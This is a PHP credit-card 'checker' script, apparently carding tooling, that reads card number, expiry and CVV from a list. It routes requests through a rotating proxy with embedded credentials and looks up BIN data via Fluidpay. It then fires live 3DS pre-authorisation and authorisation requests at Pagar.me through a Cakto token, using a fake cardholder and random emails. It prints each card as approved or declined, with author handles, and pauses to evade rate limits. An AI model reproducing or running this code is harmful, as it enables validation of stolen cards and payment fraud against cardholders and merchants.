<?php

error_reporting(0);
ini_set('display_errors', 0); 
date_default_timezone_set('Asia/Jakarta');

// ============================================================
// CONFIGURAÇÃO DE PROXY
// ============================================================
$proxyString = "http://nwzfyehi-rotate:ifxqyz4hazzy@p.webshare.io:80";
$proxyParts = parse_url($proxyString);
$proxyHost = $proxyParts['host'];
$proxyPort = $proxyParts['port'];
$proxyUser = $proxyParts['user'] ?? '';
$proxyPass = $proxyParts['pass'] ?? '';

// Função para aplicar proxy no CURL
function applyProxy($ch, $host, $port, $user, $pass) {
    curl_setopt($ch, CURLOPT_PROXY, "$host:$port");
    if ($user && $pass) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user:$pass");
    }
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
}

// ============================================================
// CONSULTA DE BIN VIA FLUIDPAY
// ============================================================
function getFluidpayDetails($bin) {
    global $proxyHost, $proxyPort, $proxyUser, $proxyPass;
    
    $ch = curl_init();
    applyProxy($ch, $proxyHost, $proxyPort, $proxyUser, $proxyPass);
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://app.fluidpay.com/api/lookup/bin/pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'Authorization: pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
            'Content-Type: application/json',
        ],
        CURLOPT_POSTFIELDS => json_encode([
            'type' => 'tokenizer',
            'type_id' => '230685b9-61e6-4dc4-8cb2-18ef6fd93146',
            'bin' => $bin,
        ]),
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode !== 200) return false;
    
    $data = json_decode($response, true);
    if (!isset($data['status']) || $data['status'] !== 'success') return false;
    
    $info = $data['data'];
    $details = implode(' ', [
        $info['card_brand'] ?? '',
        $info['card_level_generic'] ?? '',
        $info['issuing_bank'] ?? '',
        strtoupper($info['country'] ?? ''),
        strtoupper($info['card_type'] ?? 'CREDIT')
    ]);
    return strtoupper(trim($details));
}

// Funções de Apoio
function multiexplode($string) {
    $delimiters = ["|", ";", ":", "/", "»", "«", ">", "<", " "];
    $one = str_replace($delimiters, $delimiters[0], $string);
    return explode($delimiters[0], $one);
}

function generate_email() {
    $domains = ["gmail.com", "hotmail.com", "outlook.com"];
    return "wzzin_" . time() . rand(10,99) . "@" . $domains[array_rand($domains)];
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    if (!isset($str[1])) return '';
    $str = explode($end, $str[1]);  
    return $str[0];
}

// Captura da Lista
$lista = $_GET['lista'] ?? '';
if (empty($lista)) exit("AGUARDANDO_CARGA...");

$dados = multiexplode($lista);
$cc = trim($dados[0] ?? '');
$mes = trim($dados[1] ?? '');
$ano = trim($dados[2] ?? '');
$cvv = trim($dados[3] ?? '');

// --- CONSULTA DE BIN (USANDO FLUIDPAY PRIMEIRO) ---
$bin_number = substr($cc, 0, 6);
$bin_info = getFluidpayDetails($bin_number);
if (!$bin_info) {
    // Fallback para bins.json ou bins.csv
    $json_str = @file_get_contents('bins.json');
    $bins = json_decode($json_str, true);
    if ($bins && isset($bins[$bin_number])) {
        $a = json_encode($bins[$bin_number]);
        $bandeira = GetStr($a, 'bandeira":"', '"');
        $nivel    = GetStr($a, 'level":"', '"');
        $bank     = GetStr($a, 'banco":"', '"');
        $pais     = GetStr($a, 'pais":"', '"');
        $bin_info = strtoupper("$bandeira $nivel $bank $pais");
    } else {
        if (!function_exists('bin')) {
            function bin ($cc_num){
                if (!file_exists("bins.csv")) return "N/A";
                $contents = file_get_contents("bins.csv");
                $pattern = preg_quote(substr($cc_num, 0, 6), '/');
                $pattern = "/^.*$pattern.*\$/m";
                if (preg_match_all($pattern, $contents, $matches)) {
                    $encontrada = implode("\n", $matches[0]);
                    $pieces = explode(";", $encontrada);
                    return strtoupper("$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]");
                }
                return "N/A";
            }
        }
        $bin_info = bin($cc);
    }
}

// Formatação de Data para Pagar.me (YYYY-MM)
$ano_full = (strlen($ano) === 2) ? '20' . $ano : $ano;
$mes_fixed = str_pad($mes, 2, '0', STR_PAD_LEFT);
$cardExpiry = "{$ano_full}-{$mes_fixed}";

// Identificação de Bandeira
$brand = "CARD";
if (strpos($cc, '4') === 0) $brand = "VISA";
else if (preg_match('/^5[1-5]/', $cc)) $brand = "MASTER";

// --- INÍCIO DO DISPARO ---
$ch = curl_init();
applyProxy($ch, $proxyHost, $proxyPort, $proxyUser, $proxyPass);

// 1. Captura de Token TDS (Cakto)
curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.cakto.com.br/api/financial/3ds/token/?provider=pagarme",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_HTTPHEADER => [
        "Origin: https://pay.cakto.com.br",
        "Referer: https://pay.cakto.com.br/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    ]
]);

$resToken = curl_exec($ch);
$dataToken = json_decode($resToken, true);
$tdsToken = null;

if (is_array($dataToken)) {
    $raw = implode("", $dataToken);
    $parsed = json_decode($raw, true);
    $tdsToken = $parsed["tds_token"] ?? null;
}

if (!$tdsToken) {
    exit('<span class="text-danger">Reprovada</span> ➔ '.$cc.' ➔ [ERRO_TDS_TOKEN] ➔ ['.$bin_info.'] ➔ @wzzin_center');
}

$headersBase = [
    "Content-Type: application/json",
    "x-tds-token: " . $tdsToken,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
];

// 2. Pre-Auth (Pagar.me)
curl_setopt($ch, CURLOPT_URL, "https://api.pagar.me/live/3ds2/pre-auth");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["acct_number" => $cc]));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headersBase);
$resPre = curl_exec($ch);
$transId = json_decode($resPre, true)["tds_server_trans_id"] ?? null;

// 3. Auth (O Teste Real)
$payloadAuth = [
    "acct_number" => $cc,
    "acct_type" => "02",
    "bill_addr" => ["street" => "Av Paulista", "number" => "1000", "city" => "Sao Paulo", "state" => "SP", "country" => "BRA", "post_code" => "01310100"],
    "browser" => ["color_depth" => 32, "java_enabled" => false, "javascript_enabled" => true, "language" => "pt-BR", "screen_height" => 1080, "screen_width" => 1920, "tz" => 180, "user_agent" => "Mozilla/5.0"],
    "card_expiry_date" => $cardExpiry,
    "cardholder_name" => "WZZIN ELITE",
    "cvv" => $cvv,
    "device_channel" => "02",
    "email" => generate_email(), 
    "merchant" => ["name" => "Cakto"],
    "purchase" => ["amount" => 3990, "currency" => "BRL", "date" => date("Y-m-d\TH:i:s.v\Z"), "instal_data" => 1],
    "tds_comp_ind" => "Y",
    "tds_requestor_url" => "https://pay.cakto.com.br/",
    "tds_server_trans_id" => $transId
];

curl_setopt($ch, CURLOPT_URL, "https://api.pagar.me/live/3ds2/auth");
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payloadAuth));
$resAuth = curl_exec($ch);
$authData = json_decode($resAuth, true);

$status = $authData["trans_status"] ?? "N/A";
$acsUrl = $authData["acs_url"] ?? null;

// ============================================================
// RETORNO FORMATADO CORRETAMENTE PARA O FRONTEND
// O frontend reconhece: Aprovada, Aproved, Live, ✅
// ============================================================
if ($acsUrl || $status == "Y" || $status == "A") {
    // FORMATO CORRETO PARA APROVADA
    echo "Aprovada ✅ " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " ➔ [BIN: " . $bin_info . "] ➔ STATUS: [" . $status . "] - VBV/SMS DETECTADO ➔ @walkerdo7";
} else {
    $msg = $authData["errors"][0]["message"] ?? "Transacao Recusada";
    // FORMATO CORRETO PARA REPROVADA
    echo "Reprovada ❌ " . $cc . "|" . $mes . "|" . $ano . "|" . $cvv . " ➔ [BIN: " . $bin_info . "] ➔ [" . $msg . "] ➔ @walkerdo7";
}

curl_close($ch);
ob_flush();

// Delay de 10 segundos
sleep(10);
?>
